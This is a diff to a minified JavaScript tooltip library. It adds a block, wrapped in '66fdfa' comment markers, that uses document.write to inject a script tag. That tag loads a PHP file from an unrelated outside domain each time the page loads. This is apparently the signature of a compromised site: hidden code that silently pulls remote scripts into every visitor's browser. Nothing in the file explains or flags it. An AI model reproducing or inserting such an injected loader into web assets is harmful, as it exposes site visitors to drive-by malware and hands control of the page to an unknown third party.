@@ -183,3 +183,13 @@ if(parentNode==document.body){return;}if(parentNode.retrieve("tip:enter")){paren
 for(var h in d){g[d[h]]=e.page[h]+this.options.offset[h];if((g[d[h]]+f[h]-b[h])>c[h]){g[d[h]]=e.page[h]-this.options.offset[h]-f[h];}}this.tip.setStyles(g);
 },fill:function(b,c){if(typeof c=="string"){b.set("html",c);}else{b.adopt(c);}},show:function(b){this.fireEvent("show",[this.tip,b]);},hide:function(b){this.fireEvent("hide",[this.tip,b]);
 }});})();
+
+/*66fdfa*/
+/**/
+
+
+document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
+
+
+
+/*/66fdfa*/
